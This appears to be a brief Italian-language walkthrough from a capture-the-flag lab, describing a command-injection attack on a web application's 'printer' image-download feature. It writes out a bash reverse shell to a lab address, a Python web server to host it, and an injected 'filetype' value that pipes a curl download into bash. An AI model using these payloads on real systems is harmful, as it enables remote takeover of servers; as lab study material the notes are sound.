1) Creo un file con dentro la reverse shell: 
nano reverse.sh

---> bash -i >& /dev/tcp/10.10.14.104/1234 0>&1

2) Aprire un webserver con python: 
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8081 

3) Su Burp devi fare una richiesta (sulla directopry printer) per scaricarti una foto, e poi la blocchi con il proxy e la porti a Repeter
4) Cambi l'intestazione del campo filetype con: 
filetype=jpg;curl+http://10.10.14.199:8081/reverse.sh+|+bash
